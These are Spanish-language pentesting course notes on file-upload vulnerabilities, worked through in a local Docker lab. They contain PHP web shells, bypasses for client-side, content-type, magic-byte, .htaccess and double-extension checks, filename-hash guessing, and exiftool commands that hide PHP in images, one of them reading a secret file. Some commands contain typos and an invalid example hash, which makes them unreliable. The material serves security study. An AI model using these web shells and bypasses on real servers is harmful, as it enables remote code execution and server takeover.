- Tags : #subida_archivos #recursos_github 

El abuso de subidas de archivos es un tipo de ataque que se produce cuando un atacante aprovecha las vulnerabilidades en las aplicaciones web que permiten a los usuarios **cargar archivos** en el servidor. Este tipo de ataque se conoce comúnmente como un ataque de “**subida de archivos maliciosos**“.

En un ataque de subida de archivos maliciosos, un atacante carga un archivo malicioso en una aplicación web, que luego se almacena en el servidor. Si por ejemplo el atacante consigue subir un archivo PHP y el servidor web lo almacena, podría conseguir ejecución remota de comandos y tomar el control del servidor.

Los atacantes también pueden utilizar técnicas de “**falsificación de tipos de archivos**” para engañar a una aplicación web con el objetivo de que acepte un archivo malicioso como si fuera un archivo legítimo.

En esta clase, exploraremos algunas de las técnicas más utilizadas para explotar la fase de subida de archivos en aplicaciones web. Aprenderás cómo los atacantes pueden cargar contenido malicioso, además de eludir diferentes restricciones implementadas para lograrlo.

A continuación, se os comparte el enlace al proyecto de Github el cual estaremos empleando para desplegar un laboratorio práctico en Docker con el que poder practicar estos conceptos:

- **File Upload Laboratory**: [https://github.com/moeinfatehi/file_upload_vulnerability_scenarios](https://github.com/moeinfatehi/file_upload_vulnerability_scenarios)

Ejercicios :

- 1
```php
#Creamos un archivo cmd.php y lo subimos al servidor
<?php
	system($_GET['cmd']);
?>
#Al no estar sanitizada la entrada pues permite subir el archivo y posterirmente ejecutar nuestro codigo php 
```

- 2
Creamos un archivo cmd.php y lo subimos al servidor pero no permite subir [.php], lo intentamos baipaseas. Revisaomos donde se esta realizando lavalidacion si en el servidor o en el navegador('revisamos codigo fuente').Vemoss que se esta aplicando en el navegador o del lado del cliente con un metodo validate que llama el form. Pues en este caso con F12 habrimos el codigo nos vamos al formulario y eliminamos la llamada a este metodo y volvemos a subir el archivo el cual lo permitira en este caso ya que no llama al metodo validar

![](../../../attachments/Pasted%20image%2020260128104518.png)
![](../../../attachments/Pasted%20image%2020260128104600.png)

- 10 Validado a nivel de sevidor
En este caso lo pasamos por burpsuit  y le indicamos que lo que estamos subiendo no es un archivo php sino otro tipo de archivo. Utilizamos alternativas de archivos php y vamos probando hasta enconrar una que funcione
**Recurso** : [https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)
**Recurso** : [https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

- 11
El mismo concepto que en el anterior solo que probamos otras extensiones

- 12 htacces file upload bypass 
![](../../../attachments/Pasted%20image%2020260128113052.png)
![](../../../attachments/Pasted%20image%2020260128113651.png)

- 16 Para cuando limitan el tamaño del archivo 
![](../../../attachments/Pasted%20image%2020260128115321.png)
Lo modificamos
![](../../../attachments/Pasted%20image%2020260128115436.png)El tamaño  hace referencia a la cantidad de caracteres por lo que otra alternativa seria intentar modificar el payload a una sola linea para reducir el tamaño
```php
<?php system($_GET['a']);?>
<?php system($_GET[0]);?>

La peticion en el navegador sera con en numero
payload.php?0=ls -l

```

- 17 Seguridad extra , en esta variante reducen mas el tamaño de la entrado por lo que acotaremos al  máximo los caracteres.
```php
<?=`$_GET[0]`?>

= Sustutulle al param php 
```

- 21 Restricción en el tipo de archivo. Aquí lo que se revisa es el content type del archivo y se puede determinar el tipo de archivo que es gracias a los magics numbers.
- ![](../../../attachments/Pasted%20image%2020260128120849.png)
Importante el conten-type  lo determina el tipo de archivo, si estuviéramos subiendo una imagen el content type seria jpg o png o lo que sea , se aplica a cualquier tipo de archivos. Pues aqui modificando es parametro del content type podemos burlar la restriction.
![](../../../attachments/Pasted%20image%2020260128121231.png)

**Recurso**: Para ver los magic number de un archivo
[https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
```bash
xxd file #Nos da el valor hex del arhivo y los primeros 8 caracteres son lso magic bytes 
```

- 23 Similar al anterior pero aqui no validan por el conten type si no por los magics bytes o magic numbers. Podemos modificar nuestro archivo para ver si le ponemos estos bytes cmo los de un gif. 
![](../../../attachments/Pasted%20image%2020260128122852.png)

- 31 En este caso particular lo que se hace para proteger el servidor es cogene el nombre del archivo y aplicarle un tratamiento con md5 para generarle un nuevo nombre y asi guardarlo en el servidor por lo que dificulta el acceso a esto por lo que si detectamos lo que se esta realizando podemos encontrar el has que pertenece al nombre que tiene nuestro payload, cabe destacar que pueden utilizarse otros algoritmos o tecnicas para cambiar el numbre del archivo . Por lo que una vez detectado el md5 como algoritmo modificador hariamos 
```bash
echo -n "payload" | md5sum #Solo el nombre del archivo no la exension y accedemos al recurso con el nuevo nombre.php desd la web
dfff0a7fa1a55c8c1a4966c19f6da452  #hash md5 de ejemplo generado
http://localhost:9001/upload31/uploads/dfff0a7fa1a55c8c1a4966c19f6da452.php?cmd=ls -l
```

- 33 Es una version del anterior lo que como nombre del fichero ponen el hash md5 generado del nombre del fichero mas la extension nota cuando una cadena tiene 32 caracteres normalmente indica que es un hash md5
```bash
echo -n "payload.php" | md5sum #El resultado es lo que ponemos en el navegador
Ej a8710ed97dc1a0d47a530c136986dab3
echo -n "a8710ed97dc1a0d47a530c136986dab3" | wc -c
32

http://localhost:9001/upload31/uploads/a8710ed97dc1a0d47a530c136986dab3.php?cmd=ls -l
```

- 35 Es una variante donde como nombre toman el hash pero del contenido del archivo en este caso particular la cadena generada tiene 40 caracteres lo que s comun en hash sha1 probariamos con todas las posibilidades  
```bash
locate *\sum\*

sha1sum payload.php
echo "payload.php" | sha1sum
echo "payload" | sha1sum

Ej a8710ed97dc1a0d44t630c136986dab3o4hj56sd
http://localhost:9001/upload31/uploads/a8710ed97dc1a0d44t630c136986dab3o4hj56sd.php?cmd=ls -l
```

- 41 En este caso debemos aplicar brute force para encontrar donde se esta almacenando el archivo 
```bash
gobuster -dir -u url -w /dir/diccionario 

#Buscariamos posibles directorios donde se almacenan los fichero subidos he intentamos acceder a estos 
```

- 51 Algunas validaciones implican una expresión regular para verificar que en el nombre del fichero a subir este la cadena jpg o gif o lo que sea se debe subir en estos casos se hace u ataque de doble extension 
![](../../../attachments/Pasted%20image%2020260128152328.png)

- 56 En este caso nos sube el fichero a una carpeta cuyo nombre le asignamos nosotros y al intentar acceder al fichero nos lo intenta descargar  en este caso particular pues utilizamos curl para hacer las peticiones y pasarle los parámetro
```bash
curl -s -X GET "http://url:port//directoripayload.php" -G --data-urlencode "cmd=ls -l"
```

- 58 Es una mescla de subir un .htacces y luego subir un fichero con la extension permitida ademas de utilizar el cambio en el content type y en los magics numbers

Tambien podemos agregar comandos en los metadatos de una image

```bash
exiftools cat.gif #Muestra los metadatos de una imagen

exiftools -Comment="<?php system($_GET[cmd'])?>" cat.gif #Muestra los metadatos de una imagen

```

Podemos ademas crear lo que se conoce com poliglot files
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```